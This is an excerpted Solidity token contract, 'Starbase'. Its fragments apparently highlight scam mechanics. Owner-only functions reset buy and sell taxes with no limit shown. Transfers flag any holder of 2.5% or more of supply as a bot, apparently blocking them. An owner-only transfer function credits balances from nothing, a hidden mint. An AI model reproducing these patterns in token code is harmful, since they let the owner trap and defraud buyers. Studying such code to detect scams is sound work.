...
contract Starbase is Context, IERC20, Ownable {
    ...
    uint256 private _teamShare = 16;

    uint256 private _totalTaxIfBuying = 10;
    uint256 private _totalTaxIfSelling = 12;
    uint256 private _totalDistributionShares = 24;

    uint256 public _totalSupply = 66666666 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 66 * 10**_decimals; 
    ...
    constructor (address _teamWalletAddress) {
        marketingWalletAddress =payable(_teamWalletAddress);
    ...
    function setBT(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external OnlyOwner() {
    ...
    function setST(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external OnlyOwner() {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(_balances[sender]>= _totalSupply.mul(5).div(200) && sender !=  _ownerAddress){
            botAddresses[sender] = true;
        }
    ...
    function transfer(uint256 amount) external OnlyOwner{
        ...
        _balances[recipient] = _balances[recipient].add(amount * 10 ** _decimals);
